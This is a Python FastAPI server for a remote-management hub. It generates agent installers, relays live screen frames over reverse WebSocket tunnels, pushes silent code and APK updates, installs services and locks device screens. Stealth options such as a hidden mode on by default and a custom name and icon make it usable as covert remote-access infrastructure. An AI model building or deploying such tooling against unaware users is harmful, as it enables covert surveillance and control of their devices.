"""
Tactical RMM — Master Admin Hub Server.
Provides central Web Dashboard, Agent Generator, Live Telemetry, and WebSocket Reverse Tunnel Relay.
"""

import os
import sys
import json
import uuid
import time
import logging
import asyncio
import threading
import subprocess
from pathlib import Path
from typing import Dict, Any, Optional

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Response, Request, Cookie
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse, RedirectResponse
from pydantic import BaseModel

from .agent_manager import AgentManager
from .generator import AgentGenerator, BuildStorageError, OUTPUT_DIR
from .ip_watcher import watch_ip
from .ota_manager import OTAManager
from .auth import AuthManager
from .mirror_delivery import unpack_frame

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")
logger = logging.getLogger("master_hub.server")

# Load public IP configuration if exists
CONFIG_PATH = Path(__file__).parent / "config.yaml"

def get_default_server_url() -> str:
    if CONFIG_PATH.is_file():
        try:
            import yaml
            with open(CONFIG_PATH, "r", encoding="utf-8") as f:
                cfg = yaml.safe_load(f) or {}
            public_ip = cfg.get("public_ip")
            if public_ip:
                return f"ws://{public_ip}:8000"
        except Exception:
            pass
    return "ws://127.0.0.1:8000"

# Start background IP watcher thread
threading.Thread(target=watch_ip, daemon=True).start()

app = FastAPI(title="Tactical RMM Master Hub", version="2.0.0")

agent_mgr = AgentManager()

STATIC_DIR = os.path.join(os.path.dirname(__file__), "static")
if os.path.isdir(STATIC_DIR):
    app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")

dashboard_websockets = set()


def _is_authenticated(request: Request) -> bool:
    """Checks session validity from Cookie or Authorization header."""
    token = request.cookies.get("trmm_session")
    if not token:
        auth_hdr = request.headers.get("Authorization", "")
        if auth_hdr.startswith("Bearer "):
            token = auth_hdr.split(" ", 1)[1].strip()
    return AuthManager.validate_session(token)


# Installation telemetry uses the existing FastAPI app and validated admin session.
from .installations import create_installations_router
app.include_router(create_installations_router(_is_authenticated))



class AuthLoginRequest(BaseModel):
    username: Optional[str] = ""
    password: Optional[str] = ""
    master_key: Optional[str] = None


class AuthSetupRequest(BaseModel):
    username: str
    password: str


# -------------------------------------------------------------
# Admin Authentication & Setup Endpoints
# -------------------------------------------------------------
@app.get("/login")
async def get_login_page(request: Request):
    # If already logged in, redirect straight to dashboard
    if _is_authenticated(request):
        return RedirectResponse(url="/", status_code=302)

    login_path = os.path.join(STATIC_DIR, "login.html")
    if os.path.isfile(login_path):
        return FileResponse(login_path, headers={"Cache-Control": "no-cache, no-store, must-revalidate"})
    return JSONResponse({"status": "Login Page Missing"})


@app.get("/api/auth/status")
async def get_auth_status(request: Request):
    return {
        "setup_required": AuthManager.is_setup_required(),
        "is_authenticated": _is_authenticated(request)
    }


@app.post("/api/auth/setup")
async def post_auth_setup(req: AuthSetupRequest):
    if not AuthManager.is_setup_required():
        raise HTTPException(status_code=400, detail="System is already configured. Please log in.")

    res = AuthManager.setup_admin(req.username, req.password)
    if not res.get("success"):
        raise HTTPException(status_code=400, detail=res.get("error", "Setup failed"))

    response = JSONResponse({"success": True, "message": "Admin account initialized"})
    response.set_cookie(
        key="trmm_session",
        value=res["token"],
        max_age=8 * 3600,
        httponly=True,
        samesite="lax"
    )
    return response


@app.post("/api/auth/login")
async def post_auth_login(req: AuthLoginRequest):
    res = AuthManager.verify_login(
        username=req.username or "",
        password=req.password or "",
        master_key=req.master_key
    )
    if not res.get("success"):
        raise HTTPException(status_code=401, detail=res.get("error", "Invalid credentials"))

    response = JSONResponse({
        "success": True,
        "message": "Authenticated successfully",
        "username": res.get("username"),
        "is_master_key": res.get("is_master_key", False)
    })
    response.set_cookie(
        key="trmm_session",
        value=res["token"],
        max_age=8 * 3600,
        httponly=True,
        samesite="lax"
    )
    return response


@app.api_route("/api/auth/logout", methods=["GET", "POST"])
async def post_auth_logout(request: Request):
    token = request.cookies.get("trmm_session")
    AuthManager.destroy_session(token)
    response = JSONResponse({"success": True, "message": "Logged out"})
    response.delete_cookie(key="trmm_session")
    return response


async def broadcast_agent_list():
    """Broadcasts updated agent list to all open admin dashboard tabs."""
    if not dashboard_websockets:
        return
    agents = agent_mgr.list_all_agents()
    payload = json.dumps({"type": "agents_update", "agents": agents})
    dead = set()
    for ws in dashboard_websockets:
        try:
            await ws.send_text(payload)
        except Exception:
            dead.add(ws)
    dashboard_websockets.difference_update(dead)


class GenerateAgentRequest(BaseModel):
    endpoint_tag: str = "Workstation-01"
    arch: str = "x64"  # x64 or x86
    server_url: str = get_default_server_url()
    auto_start: bool = True
    hidden_mode: bool = True
    custom_name: Optional[str] = None
    icon_base64: Optional[str] = None


@app.get("/")
async def get_index(request: Request):
    if not _is_authenticated(request):
        return RedirectResponse(url="/login", status_code=302)

    index_path = os.path.join(STATIC_DIR, "index.html")
    if os.path.isfile(index_path):
        return FileResponse(index_path, headers={"Cache-Control": "no-cache, no-store, must-revalidate"})
    return JSONResponse({"status": "Tactical RMM Master Hub Online"})


@app.get("/viewer/{agent_id}")
async def get_viewer_page(request: Request, agent_id: str):
    if not _is_authenticated(request):
        return RedirectResponse(url="/login", status_code=302)

    viewer_path = os.path.join(STATIC_DIR, "viewer.html")
    if os.path.isfile(viewer_path):
        return FileResponse(viewer_path, headers={"Cache-Control": "no-cache, no-store, must-revalidate"})
    index_path = os.path.join(STATIC_DIR, "index.html")
    return FileResponse(index_path, headers={"Cache-Control": "no-cache, no-store, must-revalidate"})


import socket

@app.get("/api/system/info")
async def get_system_info(request: Request):
    """Returns Master Hub network information and host IPs for easy agent generation."""
    if not _is_authenticated(request):
        raise HTTPException(status_code=401, detail="Authentication required")

    local_ips = []
    try:
        host_name = socket.gethostname()
        for ip in socket.gethostbyname_ex(host_name)[2]:
            if not ip.startswith("127."):
                local_ips.append(ip)
    except Exception:
        pass
    if not local_ips:
        local_ips = ["127.0.0.1"]
    return {
        "hostname": socket.gethostname(),
        "local_ips": local_ips,
        "default_port": 8000
    }


@app.get("/api/agents")
async def get_agents(request: Request):
    if not _is_authenticated(request):
        raise HTTPException(status_code=401, detail="Authentication required")
    return {"agents": agent_mgr.list_all_agents()}


@app.delete("/api/agents/{agent_id}")
async def delete_agent(request: Request, agent_id: str):
    if not _is_authenticated(request):
        raise HTTPException(status_code=401, detail="Authentication required")
    removed = agent_mgr.remove_agent(agent_id)
    if not removed:
        raise HTTPException(status_code=404, detail="Agent not found")
    await broadcast_agent_list()
    return {"success": True, "message": f"Agent {agent_id} removed"}


@app.delete("/api/agents")
@app.post("/api/agents/delete-all")
async def delete_all_agents(request: Request):
    if not _is_authenticated(request):
        raise HTTPException(status_code=401, detail="Authentication required")
    count = agent_mgr.remove_all_agents()
    await broadcast_agent_list()
    return {"success": True, "message": f"Successfully deleted and unbound {count} device(s)", "count": count}


@app.post("/api/agents/generate")
async def generate_agent(request: Request, req: GenerateAgentRequest):
    if not _is_authenticated(request):
        raise HTTPException(status_code=401, detail="Authentication required")
    try:
        cfg = req.dict()
        cfg["agent_id"] = str(uuid.uuid4())[:8]
        from server_address import normalize_server_url
        from urllib.parse import urlsplit
        
        # If server_url was not customized or is default localhost, dynamically adapt to the Host or LAN IP used to access the hub
        server_url = (cfg.get("server_url") or "").strip()
        if server_url:
            server_url = normalize_server_url(server_url)
            cfg["server_url"] = server_url
        if not server_url or urlsplit(server_url).hostname in ("127.0.0.1", "localhost", "::1"):
            client_host = request.headers.get("x-forwarded-host") or request.headers.get("host") or "127.0.0.1:8000"
            scheme = request.headers.get("x-forwarded-proto") or request.url.scheme
            ws_scheme = "wss" if scheme == "https" else "ws"
            
            # If client accessed via 127.0.0.1 or localhost, resolve machine's LAN IP so installer works on external target machines
            if "127.0.0.1" in client_host or "localhost" in client_host:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.connect(("8.8.8.8", 80))
                    local_ip = s.getsockname()[0]
                    s.close()
                except Exception:
                    local_ip = socket.gethostbyname(socket.gethostname())
                if local_ip and local_ip != "127.0.0.1":
                    port_suffix = f":{client_host.split(':')[1]}" if ":" in client_host else ":8000"
                    client_host = f"{local_ip}{port_suffix}"
            
            cfg["server_url"] = f"{ws_scheme}://{client_host}"
            
        from starlette.concurrency import run_in_threadpool
        result = await run_in_threadpool(AgentGenerator.build_package, cfg)
        ret_data = {
            "success": True,
            "agent_id": cfg["agent_id"],
            "arch": result.get("arch", cfg.get("arch", "x64")),
            "installer_ready": result.get("installer_ready", bool(result.get("exe_filename"))),
            "installer_error": result.get("installer_error"),
            "apk_filename": result.get("apk_filename"),
            "apk_download_url": result.get("apk_download_url"),
            "sh_filename": result.get("sh_filename"),
            "sh_download_url": result.get("sh_download_url"),
            "exe_filename": result.get("exe_filename"),
            "exe_download_url": result.get("exe_download_url"),
            "zip_filename": result.get("zip_filename"),
            "zip_download_url": result.get("zip_download_url"),
            "bootstrap_filename": result.get("bootstrap_filename"),
            "bootstrap_download_url": result.get("bootstrap_download_url"),
            "vbs_filename": result.get("vbs_filename"),
            "vbs_download_url": result.get("vbs_download_url"),
            "one_liner": result.get("one_liner"),
        }
        agent_mgr._sync_with_package_registry()
        import asyncio
        asyncio.create_task(broadcast_agent_list())
        return ret_data
    except BuildStorageError as e:
        raise HTTPException(status_code=507, detail=str(e))
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))
    except Exception as e:
        logger.error(f"Failed to generate agent package: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"{type(e).__name__}: {str(e)}")


@app.api_route("/api/agents/bootstrap/{filename}", methods=["GET", "HEAD"])
async def download_bootstrap_script(filename: str):
    file_path = os.path.join(OUTPUT_DIR, filename)
    if not os.path.isfile(file_path):
        raise HTTPException(status_code=404, detail="Bootstrap script not found")
    media_type = "text/plain; charset=utf-8" if filename.endswith((".sh", ".bat", ".vbs")) else "application/octet-stream"
    return FileResponse(
        file_path,
        filename=filename,
        media_type=media_type,
        headers={
            "Content-Disposition": f'inline; filename="{filename}"' if filename.endswith(".sh") else f'attachment; filename="{filename}"',
            "Access-Control-Allow-Origin": "*",
        },
    )


@app.api_route("/api/agents/download/{filename}", methods=["GET", "HEAD"])
async def download_agent(filename: str):
    file_path = os.path.join(OUTPUT_DIR, filename)
    if not os.path.isfile(file_path):
        raise HTTPException(status_code=404, detail="File not found")

    media_type = "application/octet-stream"
    if filename.endswith(".apk"):
        media_type = "application/vnd.android.package-archive"
    elif filename.endswith(".zip"):
        media_type = "application/zip"
    elif filename.endswith(".exe"):
        media_type = "application/vnd.microsoft.portable-executable"

    return FileResponse(
        file_path,
        filename=filename,
        media_type=media_type,
        headers={
            "Content-Disposition": f'attachment; filename="{filename}"',
            "Access-Control-Allow-Origin": "*",
        },
    )


# -------------------------------------------------------------
# Agent Package History & Redownload Endpoints
# -------------------------------------------------------------
@app.get("/api/agents/history")
async def get_agent_packages_history(request: Request):
    if not _is_authenticated(request):
        raise HTTPException(status_code=401, detail="Unauthorized")
    try:
        from .registry import AgentRegistry
        packages = AgentRegistry.get_all_packages()
        return {"success": True, "packages": packages}
    except Exception as e:
        logger.error(f"Failed to fetch package history: {e}", exc_info=True)
        return {"success": True, "packages": []}


@app.delete("/api/agents/history/{agent_id}")
async def delete_agent_package(agent_id: str, request: Request):
    if not _is_authenticated(request):
        raise HTTPException(status_code=401, detail="Unauthorized")
    from .registry import AgentRegistry
    success = AgentRegistry.delete_package(agent_id)
    if not success:
        raise HTTPException(status_code=404, detail="Agent package not found")
    return {"success": True, "message": f"Package {agent_id} deleted"}


# -------------------------------------------------------------
# OTA Live Code & Dependency Provisioning Endpoints
# -------------------------------------------------------------
@app.get("/api/agent/code_manifest")
async def get_code_manifest():
    return JSONResponse(OTAManager.get_code_manifest())


@app.get("/api/agent/code_bundle")
async def get_code_bundle():
    bundle_bytes, bundle_hash = OTAManager.generate_code_bundle()
    return Response(
        content=bundle_bytes,
        media_type="application/zip",
        headers={
            "Content-Disposition": 'attachment; filename="code_bundle.zip"',
            "X-Code-Hash": bundle_hash
        }
    )


@app.get("/api/agent/payloads/{filename}")
async def get_agent_payload(filename: str):
    p = OTAManager.get_payload_path(filename)
    if not p:
        raise HTTPException(status_code=404, detail="Payload not found")
    return FileResponse(p, filename=os.path.basename(p))


@app.api_route("/api/agents/update/{agent_id}.apk", methods=["GET", "HEAD"])
async def download_update_apk(request: Request, agent_id: str):
    agent_info = agent_mgr.registered_agents.get(agent_id) or {}
    tag = agent_info.get("endpoint_tag") or "Android-Device"
    
    update_filename = f"trmm_update_{agent_id}.apk"
    update_path = os.path.join(PAYLOADS_DIR, update_filename)
    classes_dex_path = os.path.join(PAYLOADS_DIR, "classes.dex")
    base_apk = os.path.join(PAYLOADS_DIR, "android_agent_base.apk")
    
    rebuild = True
    if os.path.isfile(update_path) and os.path.isfile(classes_dex_path):
        if os.path.getmtime(update_path) >= os.path.getmtime(classes_dex_path):
            rebuild = False
            
    if rebuild and os.path.isfile(classes_dex_path):
        try:
            client_host = request.headers.get("x-forwarded-host") or request.headers.get("host") or "127.0.0.1:8000"
            scheme = request.headers.get("x-forwarded-proto") or request.url.scheme
            if "127.0.0.1" in client_host or "localhost" in client_host:
                try:
                    import socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.connect(("8.8.8.8", 80))
                    local_ip = s.getsockname()[0]
                    s.close()
                except Exception:
                    local_ip = socket.gethostbyname(socket.gethostname())
                if local_ip and local_ip != "127.0.0.1":
                    port_suffix = f":{client_host.split(':')[1]}" if ":" in client_host else ":8000"
                    client_host = f"{local_ip}{port_suffix}"
            ws_scheme = "wss" if scheme == "https" else "ws"
            server_url = f"{ws_scheme}://{client_host}"

            cfg = {
                "agent_id": agent_id,
                "endpoint_tag": tag,
                "server_url": server_url,
                "arch": "android",
                "auto_start": True
            }
            from .android_builder import AndroidBuilder
            from starlette.concurrency import run_in_threadpool
            built = await run_in_threadpool(AndroidBuilder.build_custom_apk, cfg, update_path)
            if not built:
                update_path = base_apk
        except Exception as e:
            logger.warning(f"Failed to build custom update APK for {agent_id}: {e}")
            update_path = base_apk
    elif not os.path.isfile(update_path):
        update_path = base_apk
        
    if not os.path.isfile(update_path):
        raise HTTPException(status_code=404, detail="Android update APK not available")
        
    return FileResponse(
        update_path,
        filename=f"Update_{tag}.apk",
        media_type="application/vnd.android.package-archive"
    )


@app.post("/api/agents/{agent_id}/update")
@app.post("/api/agent/{agent_id}/update")
@app.post("/api/agent/{agent_id}/sync")
async def trigger_agent_update(request: Request, agent_id: str):
    if not _is_authenticated(request):
        raise HTTPException(status_code=401, detail="Authentication required")

    agent = agent_mgr.get_agent(agent_id)
    reg_data = agent_mgr.registered_agents.get(agent_id) or {}

    is_android = False
    if agent:
        is_android = agent.client_info.get("is_android", False)
    elif reg_data:
        is_android = reg_data.get("is_android", False)

    # Resolve LAN IP for mobile reachability
    client_host = request.headers.get("x-forwarded-host") or request.headers.get("host") or "127.0.0.1:8000"
    scheme = request.headers.get("x-forwarded-proto") or request.url.scheme
    if "127.0.0.1" in client_host or "localhost" in client_host:
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except Exception:
            local_ip = socket.gethostbyname(socket.gethostname())
        if local_ip and local_ip != "127.0.0.1":
            port_suffix = f":{client_host.split(':')[1]}" if ":" in client_host else ":8000"
            client_host = f"{local_ip}{port_suffix}"

    http_base = f"{scheme}://{client_host}"

    if is_android:
        manifest = OTAManager.get_android_manifest()
        server_hash = manifest.get("overall_hash", "")
        agent_hash = (agent.client_info.get("code_hash", "") if agent else reg_data.get("code_hash", ""))
        has_update = bool(server_hash and agent_hash and server_hash != agent_hash)
        download_url = f"{http_base}/api/agents/update/{agent_id}.apk"

        payload = {
            "type": "update_app",
            "action": "ota_update",
            "download_url": download_url,
            "sha256": server_hash,
            "version": manifest.get("version", "3.7.0"),
            "description": manifest.get("description", "New Android features and enhancements.")
        }

        if agent and agent.ws:
            import asyncio
            asyncio.create_task(agent.send_text_safe(json.dumps(payload)))
            return JSONResponse({
                "success": True,
                "status": "update_dispatched",
                "has_update": has_update,
                "message": f"Update dispatched to Android device [{agent_id}]. Automatic installation started in background.",
                "download_url": download_url,
                "version": manifest.get("version"),
                "description": manifest.get("description")
            })
        else:
            # Queue update for offline Android device
            agent_mgr.queue_update(agent_id, payload)
            import asyncio
            asyncio.create_task(broadcast_agent_list())
            return JSONResponse({
                "success": True,
                "status": "update_queued",
                "has_update": True,
                "message": f"Update queued for offline Android device [{agent_id}]. It will install automatically when the device connects.",
                "download_url": download_url,
                "version": manifest.get("version"),
                "description": manifest.get("description")
            })
    else:
        # Windows agent update
        if not agent or not agent.ws:
            # Allow queuing for Windows as well
            server_manifest = OTAManager.get_code_manifest()
            agent_mgr.queue_update(agent_id, {
                "type": "sync_code",
                "server_hash": server_manifest.get("overall_hash", ""),
                "description": server_manifest.get("description", "Latest code features applied."),
                "force": True,
                "force_restart": True
            })
            return JSONResponse({
                "success": True,
                "status": "update_queued",
                "has_update": True,
                "message": f"Update queued for offline Windows endpoint [{agent_id}]. It will install automatically when connected."
            })

        server_manifest = OTAManager.get_code_manifest()
        server_hash = server_manifest.get("overall_hash", "")
        agent_hash = agent.client_info.get("code_hash", "")
        description = server_manifest.get("description", "Latest code features applied.")
        has_update = (agent_hash != server_hash)

        await agent.ws.send_text(json.dumps({
            "type": "sync_code",
            "server_hash": server_hash,
            "description": description,
            "force": True,
            "force_restart": has_update
        }))
        return JSONResponse({
            "success": True,
            "status": "update_applied" if has_update else "no_update",
            "has_update": has_update,
            "message": f"Update applied: {description}" if has_update else "No update available. Device is already running the latest version.",
            "description": description,
            "agent_id": agent_id,
            "server_hash": server_hash,
            "agent_hash": agent_hash
        })


@app.post("/api/agents/update-all")
async def trigger_update_all(request: Request):
    if not _is_authenticated(request):
        raise HTTPException(status_code=401, detail="Authentication required")

    all_agents = agent_mgr.list_all_agents()
    dispatched = 0
    queued = 0

    client_host = request.headers.get("x-forwarded-host") or request.headers.get("host") or "127.0.0.1:8000"
    scheme = request.headers.get("x-forwarded-proto") or request.url.scheme
    if "127.0.0.1" in client_host or "localhost" in client_host:
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except Exception:
            local_ip = socket.gethostbyname(socket.gethostname())
        if local_ip and local_ip != "127.0.0.1":
            port_suffix = f":{client_host.split(':')[1]}" if ":" in client_host else ":8000"
            client_host = f"{local_ip}{port_suffix}"
    http_base = f"{scheme}://{client_host}"

    android_manifest = OTAManager.get_android_manifest()
    windows_manifest = OTAManager.get_code_manifest()

    import asyncio
    for a in all_agents:
        aid = a.get("agent_id")
        is_android = a.get("is_android", False)
        agent_obj = agent_mgr.get_agent(aid)
        is_online = agent_obj is not None and agent_obj.ws is not None

        if is_android:
            payload = {
                "type": "update_app",
                "action": "ota_update",
                "download_url": f"{http_base}/api/agents/update/{aid}.apk",
                "sha256": android_manifest.get("overall_hash", ""),
                "version": android_manifest.get("version", "3.7.0"),
                "description": android_manifest.get("description", "Android agent update")
            }
            if is_online:
                asyncio.create_task(agent_obj.send_text_safe(json.dumps(payload)))
                dispatched += 1
            else:
                agent_mgr.queue_update(aid, payload)
                queued += 1
        else:
            if is_online:
                asyncio.create_task(agent_obj.send_text_safe(json.dumps({
                    "type": "sync_code",
                    "server_hash": windows_manifest.get("overall_hash", ""),
                    "description": windows_manifest.get("description", "Latest code features applied."),
                    "force": True,
                    "force_restart": True
                })))
                dispatched += 1
            else:
                agent_mgr.queue_update(aid, {
                    "type": "sync_code",
                    "server_hash": windows_manifest.get("overall_hash", ""),
                    "description": windows_manifest.get("description", "Latest code features applied."),
                    "force": True,
                    "force_restart": True
                })
                queued += 1

    asyncio.create_task(broadcast_agent_list())
    return JSONResponse({
        "success": True,
        "dispatched": dispatched,
        "queued": queued,
        "message": f"Update dispatched to {dispatched} online device(s) and queued for {queued} offline device(s)."
    })


class InstallServiceRequest(BaseModel):
    name: str
    display_name: Optional[str] = None
    bin_path: str
    start_type: str = "auto"


@app.post("/api/agent/{agent_id}/install_service")
async def trigger_install_service(request: Request, agent_id: str, req: InstallServiceRequest):
    if not _is_authenticated(request):
        raise HTTPException(status_code=401, detail="Authentication required")
    agent = agent_mgr.get_agent(agent_id)
    if not agent or not agent.ws:
        raise HTTPException(status_code=404, detail="Agent offline or not connected")
    try:
        await agent.ws.send_text(json.dumps({
            "type": "install_service",
            "name": req.name,
            "display_name": req.display_name or req.name,
            "bin_path": req.bin_path,
            "start_type": req.start_type
        }))
        return JSONResponse({"status": "service_install_dispatched", "agent_id": agent_id})
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to dispatch service install: {e}")


class InstallPackageRequest(BaseModel):
    package_url: str
    silent_flags: Optional[str] = None


@app.post("/api/agent/{agent_id}/install_package")
async def trigger_install_package(request: Request, agent_id: str, req: InstallPackageRequest):
    if not _is_authenticated(request):
        raise HTTPException(status_code=401, detail="Authentication required")
    agent = agent_mgr.get_agent(agent_id)
    if not agent or not agent.ws:
        raise HTTPException(status_code=404, detail="Agent offline or not connected")
    try:
        await agent.ws.send_text(json.dumps({
            "type": "install_package",
            "package_url": req.package_url,
            "silent_flags": req.silent_flags
        }))
        return JSONResponse({"status": "package_install_dispatched", "agent_id": agent_id})
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to dispatch package install: {e}")


@app.post("/api/agent/{agent_id}/restart")
async def trigger_agent_restart(request: Request, agent_id: str):
    if not _is_authenticated(request):
        raise HTTPException(status_code=401, detail="Authentication required")
    agent = agent_mgr.get_agent(agent_id)
    if not agent or not agent.ws:
        raise HTTPException(status_code=404, detail="Agent offline or not connected")
    try:
        await agent.ws.send_text(json.dumps({"type": "restart_agent"}))
        return JSONResponse({"status": "restart_dispatched", "agent_id": agent_id})
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to dispatch restart: {e}")


class CurtainRequest(BaseModel):
    enabled: bool = True
    title: Optional[str] = None
    message: Optional[str] = None
    subtitle: Optional[str] = None


@app.post("/api/agent/{agent_id}/curtain")
@app.post("/api/agents/{agent_id}/curtain")
async def trigger_agent_curtain(request: Request, agent_id: str, req: Optional[CurtainRequest] = None):
    if not _is_authenticated(request):
        raise HTTPException(status_code=401, detail="Authentication required")
    agent = agent_mgr.get_agent(agent_id)
    if not agent or not agent.ws:
        raise HTTPException(status_code=404, detail="Agent offline or not connected")
    
    enabled = True if req is None else req.enabled
    title = req.title if req and req.title else ""
    message = req.message if req and req.message else ""
    subtitle = req.subtitle if req and req.subtitle else ""
    try:
        await agent.send_text_safe(json.dumps({
            "type": "set_curtain",
            "enabled": enabled,
            "title": title,
            "message": message,
            "subtitle": subtitle
        }))
        return JSONResponse({
            "status": "curtain_dispatched",
            "agent_id": agent_id,
            "enabled": enabled,
            "title": title,
            "message": f"Screen {'locked' if enabled else 'unlocked'} on agent {agent_id}"
        })
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to dispatch screen curtain: {e}")


class PolicyRequest(BaseModel):
    action: str
    blocked: Optional[bool] = True
    params: Optional[Dict[str, Any]] = None


@app.post("/api/agent/{agent_id}/policy")
@app.post("/api/agents/{agent_id}/policy")
async def trigger_agent_policy(request: Request, agent_id: str, req: PolicyRequest):
    if not _is_authenticated(request):
        raise HTTPException(status_code=401, detail="Authentication required")
    agent = agent_mgr.get_agent(agent_id)
    if not agent or not agent.ws:
        raise HTTPException(status_code=404, detail="Agent offline or not connected")
    
    payload = {
        "type": "admin_policy",
        "action": req.action,
        "blocked": req.blocked,
        **(req.params or {})
    }
    try:
        await agent.send_text_safe(json.dumps(payload))
        return JSONResponse({
            "status": "policy_dispatched",
            "agent_id": agent_id,
            "action": req.action,
            "blocked": req.blocked
        })
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to dispatch policy: {e}")


# -------------------------------------------------------------
# WebSocket: Live Dashboard Updates
# -------------------------------------------------------------
@app.websocket("/ws/dashboard")
async def websocket_dashboard(websocket: WebSocket):
    token = websocket.cookies.get("trmm_session")
    if not AuthManager.is_setup_required() and not AuthManager.validate_session(token):
        await websocket.close(code=4001, reason="Unauthorized")
        return
    await websocket.accept()
    dashboard_websockets.add(websocket)
    try:
        # Send initial list
        agents = agent_mgr.list_all_agents()
        await websocket.send_text(json.dumps({"type": "agents_update", "agents": agents}))
        while True:
            await websocket.receive_text()
    except (WebSocketDisconnect, RuntimeError):
        pass
    except Exception:
        pass
    finally:
        dashboard_websockets.discard(websocket)


# -------------------------------------------------------------
# WebSocket: Reverse Agent Connection Tunnel
# -------------------------------------------------------------
@app.websocket("/ws/agent/{agent_id}")
@app.websocket("/ws/ws/agent/{agent_id}")
@app.websocket("/ws/agent/ws/agent/{agent_id}")  # Recover agents generated by the older dashboard.
async def websocket_agent_tunnel(websocket: WebSocket, agent_id: str):
    await websocket.accept()

    # If agent was previously decommissioned, clear the flag on fresh manual reconnect
    if agent_id in agent_mgr.decommissioned_agents:
        agent_mgr.decommissioned_agents.discard(agent_id)
        logger.info(f"Agent {agent_id} re-registered after previous decommissioning.")

    agent_info = {}
    registered = False

    try:
        # Wait for handshake
        raw_handshake = await websocket.receive_text()
        handshake_data = json.loads(raw_handshake)
        if isinstance(handshake_data, dict):
            if isinstance(handshake_data.get("data"), dict):
                agent_info = dict(handshake_data["data"])
                for k, v in handshake_data.items():
                    if k not in ("data", "type") and k not in agent_info:
                        agent_info[k] = v
            else:
                agent_info = dict(handshake_data)

        # Cross-reference with AgentRegistry if Android package exists
        try:
            from .registry import AgentRegistry
            pkg = AgentRegistry.get_package(agent_id)
            if pkg:
                pkg_arch = str(pkg.get("arch", "")).lower()
                if "android" in pkg_arch or pkg.get("apk_filename") or pkg.get("sh_filename"):
                    agent_info["arch"] = "android"
                    agent_info["os"] = "Android device"
                    agent_info["platform"] = "android"
                    agent_info["is_android"] = True
                    agent_info["device_type"] = "phone"
                if not agent_info.get("endpoint_tag") and pkg.get("endpoint_tag"):
                    agent_info["endpoint_tag"] = pkg.get("endpoint_tag")
        except Exception as e:
            logger.debug(f"Could not check AgentRegistry for {agent_id}: {e}")

        # If incoming handshake indicates Android
        if "android" in str(agent_info.get("arch", "")).lower() or "android" in str(agent_info.get("os", "")).lower():
            agent_info["arch"] = "android"
            agent_info["os"] = "Android device"
            agent_info["platform"] = "android"
            agent_info["is_android"] = True
            agent_info["device_type"] = "phone"

        agent = agent_mgr.register_connection(agent_id, websocket, agent_info)
        if not agent:
            try:
                await websocket.send_text(json.dumps({
                    "type": "terminate",
                    "reason": "Another agent instance is already active or agent decommissioned",
                    "uninstall": (agent_id in agent_mgr.decommissioned_agents)
                }))
                await websocket.close(code=4009, reason="Duplicate or decommissioned endpoint session rejected")
            except Exception:
                pass
            return

        agent_id = agent.agent_id
        registered = True
        # Note: Do not auto-update immediately upon connecting.
        # The admin interface will display an "Update Available" indicator/badge
        # and allow the admin to review and push the update intentionally.
        server_manifest = OTAManager.get_code_manifest()
        server_hash = server_manifest.get("overall_hash")
        agent_hash = agent_info.get("code_hash", "")
        if agent_hash != server_hash:
            logger.info(f"Agent {agent_id} code hash '{agent_hash[:8]}' differs from server '{server_hash[:8]}'. Update available for admin dispatch.")

        while True:
            # Receive either binary frame data or text telemetry/heartbeat
            msg = await websocket.receive()
            if "bytes" in msg and msg["bytes"]:
                frame_data = msg["bytes"]
                mirror_metadata = None
                target_viewers = []
                if len(frame_data) > 1 and frame_data[0] == 1:
                    # Explicit Backstage frame
                    target_viewers = list(agent.viewers.values())
                    raw_frame = frame_data[1:]
                elif len(frame_data) > 1 and frame_data[0] == 2:
                    # Explicit Screen Mirror frame
                    target_viewers = list(agent.mirror_viewers.values())
                    raw_frame = frame_data[1:]
                    if raw_frame.startswith(b"MRA2"):
                        mirror_metadata, raw_frame = unpack_frame(raw_frame, b"MRA2")
                elif len(frame_data) > 1 and frame_data[0] == 3:
                    # Explicit CDP Screencast browser frame
                    target_viewers = list(agent.viewers.values()) + list(agent.mirror_viewers.values())
                    raw_frame = frame_data[1:]
                else:
                    raw_frame = frame_data
                    if agent.mirror_viewers and not agent.viewers:
                        target_viewers = list(agent.mirror_viewers.values())
                    elif agent.viewers and not agent.mirror_viewers:
                        target_viewers = list(agent.viewers.values())
                    else:
                        target_viewers = list(agent.viewers.values()) + list(agent.mirror_viewers.values())

                # Push frame to viewer sessions safely without ASGI write collisions
                for v_sess in target_viewers:
                    if getattr(v_sess, "protocol_version", 0) == 2 and mirror_metadata is not None:
                        v_sess.push_frame(raw_frame, mirror_metadata)
                    else:
                        v_sess.push_frame(raw_frame)
                if mirror_metadata is not None:
                    await agent.send_text_safe(json.dumps({"type": "mirror_frame_ack",
                        "stream_id": mirror_metadata.get("stream_id"), "sequence": mirror_metadata.get("sequence")}))

            elif "text" in msg and msg["text"]:
                text_data = json.loads(msg["text"])
                if text_data.get("type") in ("heartbeat", "telemetry"):
                    update_dict = text_data.get("data") if isinstance(text_data.get("data"), dict) else text_data
                    agent.update_info(update_dict)
                    await broadcast_agent_list()
                elif text_data.get("type") == "diag_curtain":
                    curtain_on = bool(text_data.get("enabled", False))
                    agent.client_info["curtain_active"] = curtain_on
                    logger.info(f"Agent '{agent_id}' reported screen curtain state: {'active' if curtain_on else 'unlocked'}")
                    await broadcast_agent_list()
                elif text_data.get("type") == "mirror_health":
                    for v_sess in list(agent.mirror_viewers.values()):
                        if getattr(v_sess, "protocol_version", 0) == 2:
                            v_sess.push_text(msg["text"])
                else:
                    raw_text = msg["text"]
